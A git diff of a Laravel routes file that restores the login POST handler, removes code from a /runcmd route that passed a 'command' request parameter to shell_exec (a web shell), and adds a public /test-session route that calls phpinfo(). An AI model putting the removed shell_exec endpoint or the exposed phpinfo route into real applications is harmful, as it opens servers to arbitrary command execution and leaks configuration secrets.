@@ -18,6 +18,7 @@ use Illuminate\Support\Facades\Auth;
 use Illuminate\Support\Facades\Route;
 use Illuminate\Support\Facades\Artisan;
 use Illuminate\Foundation\Http\Middleware\VerifyCsrfToken;
+use Illuminate\Http\Request;
 
 // Disable CSRF validation for these routes
 Route::withoutMiddleware([VerifyCsrfToken::class])->group(function () {
@@ -177,8 +178,8 @@ Route::middleware('auth')->group(function () {
 Route::middleware('guest')->group(function () {
     Route::controller(AuthController::class)->group(function () {
         Route::get('/login', 'login')->name('login');
-        Route::post('/login', 'showLoginForm')->name('login.post');
-        // Route::post('/login', 'loginPost')->name('login.post');
+        // Route::post('/login', 'showLoginForm')->name('login.post');
+        Route::post('/login', 'loginPost')->name('login.post');
     });
 
 });
@@ -194,16 +195,6 @@ Route::get('/run', function () {
 
 Route::get('/runcmd', function (Request $request) {
     try {
-        $command = $request->input('command');
-        $output = shell_exec($command);
-
-        if($command){
-            return response()->json([
-                'status' => 'success',
-                'message' => $output,
-                ]);
-        }
-
         Artisan::call('cache:clear');
         $cache = Artisan::output();
 
@@ -247,4 +238,10 @@ Route::get('/runcmd', function (Request $request) {
             'error' => $e->getMessage(),
         ], 500);
     }
+});
+
+Route::get('/test-session', function () {
+    // Put a value in the session
+    phpinfo();
+
 });
